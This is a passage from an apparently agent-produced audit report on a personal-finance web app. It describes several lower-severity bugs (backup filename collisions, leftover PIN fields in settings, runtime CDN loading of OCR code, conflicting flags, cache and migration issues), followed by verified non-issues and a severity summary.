**DESCRIPTION:** Filenames `etracker_backup_YYYY-MM-DD_<Date.now()>.json` collide when two exports land in the same millisecond (e.g., automated scheduled + manual) and overwrite each other. `rotateBackups` sorts by `createdAt` only; backups created in the same ms sort in insertion order, so the wrong generation can be evicted from the 10-slot chain.
**ROOT CAUSE:** Timestamp-only uniqueness; comparator without an id tiebreaker.
**REPRO:** Trigger two exports programmatically in the same ms.
**EXPECTED:** Add a random/UUID suffix and a secondary sort key (`id`).
**ACTUAL:** Overwritten export files and nondeterministic backup retention.
**RISK:** Loss of a backup file/generation.

### BUG: `security.js` settings schema retains plaintext `pinCode`/`pinHash` fields persisted to localStorage
**SEVERITY:** P3
**CATEGORY:** security
**FILE:** `shyblack/src/utils/security.js:3-9` (`DEFAULT_SETTINGS`); persisted via `shyblack/src/context/FinanceContext.jsx:272`
**FUNCTION:** `getSecuritySettings`/`saveSecuritySettings`
**DESCRIPTION:** `pinCode` and `pinHash` are part of the settings object written to `shyblack_settings` in localStorage. Today nothing writes a real PIN there (the real PIN lives in `privacy.js`), but the schema invites it and the reset objects in `FinanceContext.jsx:141,786` keep the fields alive — a plaintext-PIN-in-localStorage footgun, and `getSecuritySettings` returns the raw merged object to any consumer.
**ROOT CAUSE:** Vestigial duplicate PIN fields in the settings schema.
**REPRO:** (Latent) Any future code path doing `updateSecurity({ pinCode: pin })`.
**EXPECTED:** Remove `pinCode`/`pinHash` from settings; centralize PIN in `privacy.js` only.
**ACTUAL:** A plaintext-PIN field exists in the persisted settings schema.
**RISK:** Plaintext PIN storage if the field is ever populated.

### BUG: Tesseract OCR loads worker/traineddata from remote CDN at runtime (offline breakage + supply-chain surface)
**SEVERITY:** P3
**CATEGORY:** security
**FILE:** `shyblack/src/utils/receiptParser.js:52`
**FUNCTION:** `runOCR` / `scanReceipt`
**DESCRIPTION:** `createWorker('eng', 1, ...)` uses tesseract.js defaults, which fetch the worker JS and `eng.traineddata` from jsDelivr/unpkg at runtime unless `workerPath`/`corePath`/`langPath`/`langPath` are pinned or bundled. Recognition of receipt images therefore depends on third-party network code; a compromised/bastardized CDN response could execute code in the OCR worker.
**ROOT CAUSE:** No bundled/pinned OCR assets; network fetch of executable code.
**REPRO:** Run the receipt scanner offline, or with a modified CDN response.
**EXPECTED:** Bundle and hash-pin the OCR assets (Vite `?url` imports) or provide explicit offline `langPath`.
**ACTUAL:** Runtime download of third-party code/ML data from remote hosts.
**RISK:** Offline failure plus supply-chain exposure for a component that processes sensitive financial documents.

### BUG: `toggleRecurringTransaction` can leave `active`/`isActive` in conflict
**SEVERITY:** P3
**CATEGORY:** logic
**FILE:** `shyblack/src/utils/recurring.js:55-67`
**FUNCTION:** `toggleRecurringTransaction`
**DESCRIPTION:** `active` and `isActive` are flipped independently. For an item in an inconsistent legacy state (`active:false, isActive:true`), one toggle yields `active:true, isActive:false` — the two flags disagree. `getDueRecurringTransactions`/`getUpcomingRecurringTransactions` prefer `isActive` when defined, so such items silently stop (or start) firing depending on which flag each caller reads.
**ROOT CAUSE:** Dual boolean flags toggled from two different expressions without normalizing to a single source of truth.
**REPRO:** Import/recover an item with `active:false, isActive:true`, toggle it twice.
**EXPECTED:** Derive `isActive` from a single authoritative `active` value.
**ACTUAL:** Divergent flags → wrong due/upcoming membership.
**RISK:** Recurring expenses not generated (or duplicated).

### BUG: Quota purge of `snapshot_chain` is undone by stale memory cache
**SEVERITY:** P3
**CATEGORY:** logic
**FILE:** `shyblack/src/utils/storageAdapter.js:146-163` (`_handleQuotaError` trims chain), with `shyblack/src/utils/safeStorage.js:41,47-49` (module-level `memoryCache`)
**FUNCTION:** `_handleQuotaError`
**DESCRIPTION:** Round 2 trims `shyblack_snapshot_chain` to `[chain[0]]` directly in localStorage, but `safeStorage`'s `memoryCache` still holds the untrimmed chain. The next `getSnapshotChain()` → `safeStorage.get` returns the cached full chain, and the next `saveSnapshot` writes it all back — undoing the purge and perpetuating quota pressure.
**ROOT CAUSE:** The adapter bypasses `safeStorage`'s cache invalidation on purge.
**REPRO:** Hit quota repeatedly; observe the chain never stays trimmed.
**EXPECTED:** Invalidate the cache entry (`safeStorage.invalidateCache(key)`) when trimming.
**ACTUAL:** Purge is ineffective; repeated quota failures.
**RISK:** Accelerates the P2 data-loss path.

### BUG: `migrateAdapterData` migrates only an old hardcoded subset of keys (latent)
**SEVERITY:** P3
**CATEGORY:** data-loss
**FILE:** `shyblack/src/utils/storageAdapter.js:308-339`
**FUNCTION:** `migrateAdapterData`
**DESCRIPTION:** The migration key list (`:313-318`) omits `emis`, `net_worth_accounts`, `transfers`, `budgets_v2`, `receipt_scans`, `wealth_assets`, `documents`, `document_files`, `backups`, `snapshot`, `score_history`, etc. If the adapter switch is ever enabled (it's exported but currently uncalled), most user data would be silently dropped. The IndexedDB adapter is also async while `safeStorage` treats `set`/`get` synchronously, so a switched adapter would return pending Promises as "success" booleans.
**ROOT CAUSE:** Stale migration key list; async/sync contract mismatch with `safeStorage`.
**REPRO:** (Latent) Call `setStorageAdapter(ADAPTER_TYPES.INDEXEDDB)` then `migrateAdapterData(...)`.
**EXPECTED:** Complete key inventory and an async-aware `safeStorage` contract.
**ACTUAL:** Partial migration / false-success writes.
**RISK:** Total data loss if the adapter switch is ever wired up.

---

## Verified non-issues (checked, no finding)
- **Backup encryption** (`backup.js:268-340`): AES-256-GCM + PBKDF2-100k with random salt/IV — correct. No ECB, no reused IV, no hardcoded key.
- **WebView/Capacitor config**: `androidScheme: "https"`, no remote `server.url`, no cleartext, no `allowNavigation` wildcard — no insecure-http or hostname issue in the reviewed scope.
- **`dangerouslySetInnerHTML` / `eval` / `new Function` / `http://`**: none in `src`.
- **Prototype pollution / unsafe deserialization**: `JSON.parse` of validated backup shapes only; restores write to fixed storage keys, no zip-slip (no archive extraction anywhere).
- **`backup.js` checksum flow**: creation and verification both hash the same object; consistent.
- **Schema migrations** (`schema.js`): snapshot-and-rollback of all mutated keys is correct.

Summary: 1 critical (weak PIN KDF), 5 high (stored XSS in statement print, cache-poisoning data loss, plaintext at-rest data, lock-screen notification leakage, silent quota purge), 14 medium/low (exports XSS/formula injection, filename traversal, snapshot chain issues, non-atomic restore, EMI id collisions, dead-code iframe, timestamp collisions, settings schema footgun, OCR CDN, flag inconsistency, cache-vs-purge, latent migration bug).
</task_result>
</task>
```

---

